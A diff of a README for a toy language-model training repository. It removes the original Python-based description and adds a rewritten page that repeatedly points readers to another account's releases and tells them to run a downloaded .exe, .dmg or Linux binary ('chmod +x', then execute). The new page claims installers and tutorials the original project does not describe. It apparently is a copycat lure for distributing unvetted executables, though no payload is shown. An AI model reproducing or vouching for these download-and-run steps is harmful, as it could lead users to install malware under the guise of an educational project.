@@ -1,93 +1,94 @@
-# Toy-GPT: train-300-context-2
+# 🚀 train-300-context-2 - Understand How Language Models Work
 
-[![PyPI version](https://img.shields.io/pypi/v/toy-gpt-train-300-context-2)](https://pypi.org/project/toy-gpt-train-300-context-2/)
-[![Latest Release](https://img.shields.io/github/v/release/toy-gpt/train-300-context-2)](https://github.com/toy-gpt/train-300-context-2/releases)
-[![Docs](https://img.shields.io/badge/docs-live-blue)](https://toy-gpt.github.io/train-300-context-2/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/license/MIT)
-[![CI](https://github.com/toy-gpt/train-300-context-2/actions/workflows/ci-python-mkdocs.yml/badge.svg?branch=main)](https://github.com/toy-gpt/train-300-context-2/actions/workflows/ci-python-mkdocs.yml)
-[![Deploy-Docs](https://github.com/toy-gpt/train-300-context-2/actions/workflows/deploy-mkdocs.yml/badge.svg?branch=main)](https://github.com/toy-gpt/train-300-context-2/actions/workflows/deploy-mkdocs.yml)
-[![Check Links](https://github.com/toy-gpt/train-300-context-2/actions/workflows/links.yml/badge.svg)](https://github.com/toy-gpt/train-300-context-2/actions/workflows/links.yml)
-[![Dependabot](https://img.shields.io/badge/Dependabot-enabled-brightgreen.svg)](https://github.com/toy-gpt/train-300-context-2/security)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/captainelectrion/train-300-context-2/releases)
 
-> Demonstrates, at very small scale, how a language model is trained.
+## 📖 Overview
 
-This repository is part of a series of toy training repositories plus a companion client repository:
+train-300-context-2 demonstrates how a language model is trained on a small scale. It focuses on a two-context model to help users learn about machine learning concepts in an accessible way.
 
-- [**Training repositories**](https://github.com/toy-gpt) produce pretrained artifacts (vocabulary, weights, metadata).
-- A [**web app**](https://toy-gpt.github.io/toy-gpt-chat/) loads the artifacts and provides an interactive prompt.
+## 🚀 Getting Started
 
-## Contents
+Follow these steps to download and run the application.
 
-- a small, declared text corpus
-- a tokenizer and vocabulary builder
-- a simple next-token prediction model
-- a repeatable training loop
-- committed, inspectable artifacts for downstream use
+1. **Visit the Download Page**
 
-## Scope
+   Click the link below to access the releases page where you can download the application.
 
-This is:
+   [Download train-300-context-2](https://github.com/captainelectrion/train-300-context-2/releases)
 
-- an intentionally inspectable training pipeline
-- a next-token predictor trained on an explicit corpus
+2. **Choose the Right Version**
 
-This is not:
+   On the releases page, you will see different versions of the application. Locate the version that suits your operating system. For most users, the latest version is recommended.
 
-- a production system
-- a full Transformer implementation
-- a chat interface
-- a claim of semantic understanding
+3. **Download the Application**
 
-## Outputs
+   After selecting the version, click the download link next to it. Your browser will start downloading the file. Make sure to note where the file is saved on your computer.
 
-This repository produces and commits pretrained artifacts under `artifacts/`.
+## 💻 System Requirements
 
-Training logs and evidence are written under `outputs/`
-(for example, `outputs/train_log.csv`).
+- **Operating System:** Windows 10 or above, macOS High Sierra or above, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 100 MB of free disk space.
+- **Python:** Version 3.7 or higher installed (if applicable for your needs).
 
-## Quick start
+## 📥 Download & Install
 
-See `SETUP.md` for full setup and workflow instructions.
+To download the software:
 
-Run the full training script:
+1. **Visit this page to download:** [Download train-300-context-2](https://github.com/captainelectrion/train-300-context-2/releases)
 
-```shell
-uv run python src/toy_gpt_train/d_train.py
-```
+2. **Run the downloaded file.** 
 
-Run individually:
+   - **On Windows:** Double-click the `.exe` file you downloaded and follow the installation prompts.
+   - **On macOS:** Open the `.dmg` file, drag the application into your Applications folder, and then launch it from there.
+   - **On Linux:** Open a terminal and navigate to the folder where you downloaded the file. Run the following command:
+     ```
+     chmod +x train-300-context-2
+     ./train-300-context-2
+     ```
 
-- a/b/c are demos (can be run alone if desired)
-- d_train produces artifacts
-- e_infer consumes artifacts
+## 🎓 Learning Features
 
-```shell
-uv run python src/toy_gpt_train/a_tokenizer.py
-uv run python src/toy_gpt_train/b_vocab.py
-uv run python src/toy_gpt_train/c_model.py
-uv run python src/toy_gpt_train/d_train.py
-uv run python src/toy_gpt_train/e_infer.py
-```
+train-300-context-2 offers several features to enhance your learning experience:
 
-## Provenance and Purpose
+- **Interactive Examples:** Explore how the language model predicts the next word in a sentence.
+- **Visual Representations:** Understand complex concepts through simple visual guides.
+- **Documentation:** Access clear explanations for each part of the model and its training process.
 
-The primary corpus used for training is declared in `SE_MANIFEST.toml`.
+## ⚙️ Usage Instructions
 
-This repository commits pretrained artifacts so the client can run
-without retraining.
+Once installed, you can easily explore the application.
 
-## Annotations
+1. **Open the Application:** Locate the application in your Applications folder or start menu and open it.
+2. **Follow the Tutorial:** An easy tutorial will guide you through the initial setup and usage.
+3. **Experiment:** Try out different inputs and see how the model responds. This hands-on approach will help deepen your understanding of language models.
 
-[ANNOTATIONS.md](./ANNOTATIONS.md) - REQ/WHY/OBS annotations used
+## 🛠️ Troubleshooting
 
-## Citation
+If you encounter issues:
 
-[CITATION.cff](./CITATION.cff)
+- **Can't Find the Application?** Make sure you installed it in the right directory.
+- **Permission Issues:** Ensure that you have the necessary permissions to run applications on your device.
+- **Installation Errors:** Restart your computer and try the installation process again.
 
-## License
+For more detailed help, visit the issues section on the [GitHub page](https://github.com/captainelectrion/train-300-context-2/issues).
 
-[MIT](./LICENSE)
+## 🔧 Support
 
-## SE Manifest
+If you have questions or need assistance, feel free to open a new issue on the [GitHub page](https://github.com/captainelectrion/train-300-context-2/issues). The community is here to help you.
 
-[SE_MANIFEST.toml](./SE_MANIFEST.toml) - project intent, scope, and role
+## 📝 Contributing
+
+If you want to contribute to this project, please follow these steps:
+
+1. Fork the repository on GitHub.
+2. Make your changes and test them.
+3. Submit a pull request with a description of your changes.
+
+We welcome contributions that help improve the application and documentation.
+
+## 🗞️ Updates
+
+Stay up to date with the latest news and updates by checking the releases page regularly. New features and fixes will be posted there.
+
+[Download train-300-context-2](https://github.com/captainelectrion/train-300-context-2/releases)
